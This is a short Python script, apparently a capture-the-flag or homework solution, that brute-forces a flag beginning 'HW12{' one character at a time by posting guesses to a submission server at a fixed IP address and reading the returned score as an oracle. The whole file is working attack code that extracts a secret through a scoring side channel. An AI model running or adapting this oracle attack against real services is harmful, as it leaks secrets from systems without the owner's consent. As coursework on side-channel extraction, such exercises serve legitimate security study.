import requests
import string

charset = string.ascii_letters + string.digits + "_}"
url = "http://140.112.91.4:45510/submit/3"
flag_prefix = "HW12{"
session = requests.Session()

original = 33

while len(flag_prefix) < 15:
    for i in charset:
        res = session.post(url, data={'code': flag_prefix+i, 'language': 'python'})
        score_line = [line for line in res.text.split('\n') if "Submission Result" in line][0]
        score = int(score_line.split(',')[-1].rstrip('</div>'))
        if score > original:
            flag_prefix = flag_prefix+i
            original = score
            break
    print(flag_prefix)
print(flag_prefix)